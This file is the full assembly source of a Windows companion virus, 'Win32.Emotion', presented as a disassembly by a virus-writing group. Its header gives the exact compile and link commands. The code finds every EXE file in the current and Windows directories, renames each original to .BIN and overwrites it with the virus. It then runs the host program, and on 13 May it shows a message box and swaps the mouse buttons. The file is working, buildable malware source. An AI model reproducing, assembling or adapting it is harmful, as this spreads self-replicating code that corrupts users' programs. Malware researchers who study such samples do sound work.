comment *
                             Win32.Emotion            млллллм млллллм млллллм
                             Disassembly by           ллл ллл ллл ллл ллл ллл
                              Darkman/29A              мммллп плллллл ллллллл
                                                      лллмммм ммммллл ллл ллл
                                                      ллллллл ллллллп ллл ллл

  Win32.Emotion is a 4608 bytes direct action companion EXE virus. Infects
  every file in current directory and Windows directory, when executed, by
  moving the original EXE file to a BIN file by the same name and overwriting
  the original EXE file with the virus.

  Compile Win32.Emotion with Turbo Assembler v 5.0 by typing:
    TASM32 /M /ML EMOTION.ASM
    TLINK32 -Tpe -x -aa EMOTION.OBJ,,, IMPORT32
    VGALIGN EMOTION.EXE
    PEWRSEC EMOTION.EXE
*

jumps
locals
.386
.model flat
; KERNEL32.dll
        extrn   ExitProcess:proc
        extrn   GetModuleHandleA:proc
        extrn   FindNextFileA:proc
        extrn   GetCommandLineA:proc
        extrn   FindFirstFileA:proc
        extrn   CopyFileA:proc
        extrn   GetSystemTime:proc
        extrn   GetWindowsDirectoryA:proc
        extrn   MoveFileA:proc
        extrn   SetCurrentDirectoryA:proc
        extrn   WinExec:proc
        extrn   GetModuleFileNameA:proc
; USER32.dll
        extrn   SwapMouseButton:proc
        extrn   MessageBoxA:proc

.data
MAX_PATH                equ     104h
NULL                    equ     00h
TRUE                    equ     01h
MB_ICONHAND             equ     10h     ; A stop-sign icon appears in the
                                        ; message box
SW_SHOWNORMAL           equ     01h     ; Activates and displays a window
INVALID_HANDLE_VALUE    equ     -01h
FALSE                   equ     00h

SYSTEMTIME struct
  wYear                 WORD    ?       ; Specifies the current year
  wMonth                WORD    ?       ; Specifies the current month;
                                        ; January = 1, February = 2, and so on
  wDayOfWeek            WORD    ?       ; Specifies the current day of the
                                        ; week
  wDay                  WORD    ?       ; Specifies the current day of the
                                        ; month
  wHour                 WORD    ?       ; Specifies the current hour
  wMinute               WORD    ?       ; Specifies the current minute
  wSecond               WORD    ?       ; Specifies the current second
  wMilliseconds         WORD    ?       ; Specifies the current millisecond
ends

FILETIME struct
  dwLowDateTime         DWORD   ?       ; Specifies the low-order 32 bits of
                                        ; the file time
  dwHighDateTime        DWORD   ?       ; Specifies the high-order 32 bits of
                                        ; the file time
FILETIME ends

WIN32_FIND_DATA struct
  dwFileAttributes      DWORD   ?       ; Specifies the file attributes of the
                                        ; file found
  ftCreationTime        FILETIME <>     ; Specifies the time the file was
                                        ; created
  ftLastAccessTime      FILETIME <>     ; Specifies the time that the file was
                                        ; last accessed
  ftLastWriteTime       FILETIME <>     ; Specifies the time that the file was
                                        ; last written to
  nFileSizeHigh         DWORD   ?       ; Specifies the high-order DWORD value
                                        ; of the file size, in bytes
  nFileSizeLow          DWORD   ?       ; Specifies the low-order DWORD value
                                        ; of the file size, in bytes
  dwReserved0           DWORD   ?       ; Reserved for future use
  dwReserved1           DWORD   ?       ; Reserved for future use
  cFileName             BYTE MAX_PATH dup(?)
                                        ; A null-terminated string that is the
                                        ; name of the file
  cAlternate            BYTE 0eh dup(?) ; A null-terminated string that is an
                                        ; alternative name for the file
ends
                db      ?
                
.code
code_begin:
        push    NULL                    ; Get module handle of KERNEL32.dll
        call    GetModuleHandleA

        push    MAX_PATH                ; Size of buffer, in characters
        push    offset cFilename        ; Pointer to buffer for module path
        push    eax                     ; Handle to module to find filename
                                        ; for
        call    GetModuleFileNameA

        jmp     _FindFirstFileA
_GetWindowsDirectoryA:
        push    MAX_PATH                ; Size of directory buffer
        push    offset cBuffer          ; Address of buffer for Windows
                                        ; directory
        call    GetWindowsDirectoryA

        push    offset szCurDir         ; Address of name of new current
                                        ; directory
        call    SetCurrentDirectoryA

        mov     [set_current_directory],TRUE

        jmp     _FindFirstFileA
_GetCommandLineA:
        call    GetCommandLineA
        mov     esi,eax                 ; ESI = pointer to the command-line
                                        ; string for the current process
        lea     edi,szCmdLine           ; EDI = pointer to szCmdLine
move_commandline_loop:
        stosb                           ; Store a byte of command-line
        lodsb                           ; AL = a byte of command-line

        or      al,al                   ; End of command-line?
        jnz     move_commandline_loop   ; Not zero? Jump to
                                        ; move_commandline_loop
        mov     eax,'.'                 ; Dot
        lea     edi,szCmdLine           ; EDI = pointer to szCmdLine
        mov     ecx,MAX_PATH            ; ECX = size of directory buffer
        repne   scasb                   ; Find the dot in the filename

        mov     dword ptr [edi],' nib'  ; Change the extention of the filename
                                        ; to .BIN
        mov     word ptr [szCmdLine],'  '

        push    offset SystemTime       ; Address of system time structure
        call    GetSystemTime

        cmp     byte ptr [SystemTime.wMonth],05h
        jne     _WinExec                ; May? Jump to _WinExec
        cmp     byte ptr [SystemTime.wDay],0dh
        jne     _WinExec                ; 13th of May? Jump to _WinExec

        push    MB_ICONHAND             ; A stop-sign icon appears in the
                                        ; message box
        push    offset szCaption        ; Address of title of message box
        push    offset szText           ; Address of text in message box
        push    NULL                    ; Message box has no owner window
        call    MessageBoxA

        push    TRUE                    ; Reverse buttons
        call    SwapMouseButton
_WinExec:
        push    SW_SHOWNORMAL           ; Activates and displays a window
        push    offset szCmdLine        ; Address of command-line
        call    WinExec

        push    00h                     ; Exit code for all threads
        call    ExitProcess
_FindFirstFileA:
        push    offset FindFileData     ; Address of returned information
        push    offset szFileName       ; Address of name of file to search
                                        ; for
        call    FindFirstFileA
        cmp     eax,INVALID_HANDLE_VALUE
        je      function_failed         ; Function failed? Jump to
                                        ; function_failed

        lea     edi,FindFileData        ; EDI = pointer to FindFileData
        lea     esi,[edi+cFileName-WIN32_FIND_DATA]
        push    eax                     ; EAX = search handle

        jmp     move_filename
_FindNextFileA:
        push    edi                     ; EDI = pointer to FindFileData
        lea     edi,[edi+cFileName-WIN32_FIND_DATA]
        mov     ecx,0dh                 ; Store thirteen zeros
        xor     al,al                   ; Zero AL
        rep     stosb                   ; Store zero

        lea     edi,szNewFileName       ; EDI = pointer to szNewFileName
        mov     ecx,0dh                 ; Store thirteen zeros
        xor     al,al                   ; Zero AL
        rep     stosb                   ; Store zero
        pop     edi                     ; EDI = pointer to FindFileData

        pop     eax                     ; EAX = search handle
        push    eax                     ; EAX = search handle

        push    edi                     ; Address of structure for data on
                                        ; found file
        push    eax                     ; Handle of search
        call    FindNextFileA
        or      eax,eax                 ; Function failed?
        jz      function_failed         ; Zero? Jump to function_failed

        lea     edi,FindFileData        ; EDI = pointer to FindFileData
        lea     esi,[edi+cFileName-WIN32_FIND_DATA]

        jmp     move_filename
function_failed:
        cmp     [set_current_directory],TRUE
        je      _GetCommandLineA        ; Equal? Jump to _GetCommandLineA

        jmp     _GetWindowsDirectoryA
move_filename:
        push    edi                     ; EDI = pointer to FindFileData
        lea     si,[edi+cFileName-WIN32_FIND_DATA]
        lea     edi,szNewFileName       ; EDI = pointer to szNewFileName
move_filename_loop:
        lodsb                           ; AL = a byte of command-line
        stosb                           ; Store a byte of command-line

        or      al,al                   ; End of command-line?
        jnz     move_filename_loop      ; Not zero? Jump to move_filename_loop

        xor     eax,eax                 ; Zero EAX
        lea     edi,szNewFileName       ; EDI = pointer to szNewFileName
        mov     ecx,41h                 ; Search through sixty-five characters
        repne   scasb                   ; Find end of filename

        mov     dword ptr [edi-04h],'nib'
        pop     edi                     ; EDI = pointer to FindFileData

        push    offset szNewFileName    ; Address of new name for the file
        lea     eax,[edi+cFileName-WIN32_FIND_DATA]
        push    eax                     ; Address of name of the existing file
        call    MoveFileA

        push    FALSE                   ; If file already exists, overwrite it
        lea     eax,[edi+cFileName-WIN32_FIND_DATA]
        push    eax                     ; Address of filename to copy to
        lea     eax,szExistingFileName  ; EAX = pointer to szExistingFileName
        push    eax                     ; Address of name of an existing file
        call    CopyFileA

        jmp     _FindNextFileA
code_end:
szFileName      db      '*.EXE',00h     ; Name of file to search for
szCaption       db      'w32.Emotion - By: Techno Phunk [TI]',00h
szText          db      'A pool of emotions, beaten and abused.',0dh,0ah
                db      'Who will swim in the stale waters? Not a one',0dh,0ah
                db      'But many will scoff and destroy this pool with apathy',00h
szCurDir:
cBuffer         db      MAX_PATH dup(00h)
                                        ; Buffer for Windows directory
szNewFileName   db      MAX_PATH dup(00h)
                                        ; New name for the file
szExistingFileName:
szCmdLine:
cFilename       db      MAX_PATH dup(00h)
                                        ; Buffer for module path
SystemTime      SYSTEMTIME <>
set_current_directory   db      FALSE
FindFileData    WIN32_FIND_DATA <>
data_end:

end          code_begin




